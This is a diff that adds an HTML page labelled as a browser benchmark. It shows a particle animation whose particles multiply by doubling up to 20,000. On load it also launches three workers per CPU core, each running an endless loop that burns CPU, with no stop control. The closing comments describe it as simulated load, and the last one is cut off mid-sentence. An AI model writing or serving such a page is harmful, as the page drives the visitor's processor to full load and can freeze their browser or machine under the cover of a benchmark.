@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Benchmark Reproductif ++</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+    }
+    canvas {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="c"></canvas>
+  <script>
+    const canvas = document.getElementById('c');
+    const ctx = canvas.getContext('2d');
+    let w = canvas.width = window.innerWidth;
+    let h = canvas.height = window.innerHeight;
+
+    window.addEventListener('resize', () => {
+      w = canvas.width = window.innerWidth;
+      h = canvas.height = window.innerHeight;
+    });
+
+    const particles = [];
+    const initialParticles = 200;
+    const maxParticles = 20000;
+
+    function randomColor() {
+      const r = Math.floor(Math.random() * 256);
+      const g = Math.floor(Math.random() * 256);
+      const b = Math.floor(Math.random() * 256);
+      return `rgb(${r},${g},${b})`;
+    }
+
+    function createParticle(x, y) {
+      return {
+        x: x !== undefined ? x : Math.random() * w,
+        y: y !== undefined ? y : Math.random() * h,
+        vx: Math.random() * 8 - 4,
+        vy: Math.random() * 8 - 4,
+        r: Math.random() * 10 + 5,
+        color: randomColor(),
+        shape: ['circle', 'square', 'triangle'][Math.floor(Math.random() * 3)],
+        lastSpawn: Date.now()
+      };
+    }
+
+    for (let i = 0; i < initialParticles; i++) {
+      particles.push(createParticle());
+    }
+
+    function drawTriangle(x, y, r) {
+      ctx.beginPath();
+      ctx.moveTo(x, y - r);
+      ctx.lineTo(x - r, y + r);
+      ctx.lineTo(x + r, y + r);
+      ctx.closePath();
+      ctx.fill();
+    }
+
+    function animate() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+      ctx.fillRect(0, 0, w, h);
+
+      const now = Date.now();
+      const newParticles = [];
+
+      for (let p of particles) {
+        p.x += p.vx;
+        p.y += p.vy;
+
+        if (p.x < 0 || p.x > w) p.vx *= -1;
+        if (p.y < 0 || p.y > h) p.vy *= -1;
+
+        let gradient = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.r);
+        gradient.addColorStop(0, p.color);
+        gradient.addColorStop(1, 'black');
+        ctx.fillStyle = gradient;
+
+        if (p.shape === 'circle') {
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fill();
+        } else if (p.shape === 'square') {
+          ctx.fillRect(p.x - p.r / 2, p.y - p.r / 2, p.r, p.r);
+        } else {
+          drawTriangle(p.x, p.y, p.r);
+        }
+
+        // Reproduction toutes les 400ms
+        if (now - p.lastSpawn > 400 && particles.length + newParticles.length < maxParticles) {
+          newParticles.push(createParticle(p.x, p.y));
+          newParticles.push(createParticle(p.x, p.y));
+          p.lastSpawn = now;
+        }
+
+        // Petit calcul inutile pour CPU
+        for (let i = 0; i < 5; i++) {
+          Math.sqrt(Math.random() * 100000);
+        }
+      }
+
+      particles.push(...newParticles);
+      requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    // CPU Burn massif
+    function burnCPU() {
+      while (true) {
+        let x = 1;
+        for (let i = 0; i < 10000000; i++) {
+          x = Math.sin(Math.sqrt(x * Math.random()));
+          x = Math.atan(Math.pow(x, 2.5));
+        }
+      }
+    }
+
+    const coreCount = navigator.hardwareConcurrency || 4;
+    for (let i = 0; i < coreCount * 3; i++) {
+      const worker = new Worker(URL.createObjectURL(new Blob([`(${burnCPU.toString()})()`])));
+    }
+  </script>
+</body>
+</html>
+<!-- This code is a benchmark for testing browser performance with a large number of particles. -->
+<!-- It creates a canvas animation where particles are generated, move around, and reproduce over time. -->
+<!-- The script also spawns multiple web workers to simulate CPU load. -->  
+<!-- The particles can be circles, squares, or triangles, and they have random colors. -->
+<!-- The animation runs continuously, updating the particle positions and rendering them on the canvas. -->
+<!-- The benchmark is designed to test how well the browser handles a large number of moving objects and
+
